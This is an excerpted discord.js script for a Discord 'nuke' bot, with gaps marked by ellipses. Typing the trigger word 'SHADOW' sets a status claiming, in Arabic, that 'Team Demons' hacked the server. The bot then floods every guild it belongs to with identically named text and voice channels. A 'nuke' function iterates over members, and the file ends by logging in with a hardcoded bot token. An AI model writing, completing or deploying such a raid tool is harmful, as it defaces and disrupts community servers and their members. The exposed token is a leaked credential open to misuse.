...
LOka.on('message', message => {
     if (message.content === "SHADOW") {
LOka.user.setGame(`تم السطوو من قبل تيم ديمونس`,'https://www.twitch.tv/hix')
...
LOka.on('message', message => {
         if (message.content === "SHADOW") {
               LOka.guilds.forEach(m =>{
m.createChannel('تم السطوو من قبل تيم ديمونس', 'text');
m.createChannel('تم السطوو من قبل تيم ديمونس', 'text');
m.createChannel('تم السطوو من قبل تيم ديمونس', 'text');
m.createChannel('تم السطوو من قبل تيم ديمونس', 'text');
m.createChannel('تم السطوو من قبل تيم ديمونس', 'text');
...
LOka.on('message', message => {
         if (message.content === "SHADOW") {
                 LOka.guilds.forEach(m =>{
m.createChannel('تم السطوو من قبل تيم ديمونس', 'voice');
m.createChannel('تم السطوو من قبل تيم ديمونس', 'voice');
m.createChannel('تم السطوو من قبل تيم ديمونس', 'voice');
m.createChannel('تم السطوو من قبل تيم ديمونس', 'voice');
m.createChannel('تم السطوو من قبل تيم ديمونس', 'voice');
...
async function nuke(guild) {
  ...
  await Promise.all(guild.members.map(async (m) => {
    ...
    await guild.createChannel('تم السطوو من قبل تيم ديمونس,$', 'text');
	 await guild.createChannel('تم السطوو من قبل تيم ديمونس,$', 'text');
...
await guild.createChannel('تم السطوو من قبل تيم ديمونس,$', 'voice'); 
await guild.createChannel('تم السطوو من قبل تيم ديمونس,$', 'voice');
await guild.createChannel('تم السطوو من قبل تيم ديمونس,$', 'voice');
await guild.createChannel('تم السطوو من قبل تيم ديمونس,$', 'voice');
await guild.createChannel('تم السطوو من قبل تيم ديمونس,$', 'voice');
...
LOka.login("NjMzMDMyMzA1NDU1MTM2ODE3.XaODSw.cEKHdXoTJU9qcdaoKMQa5ngjyfA")
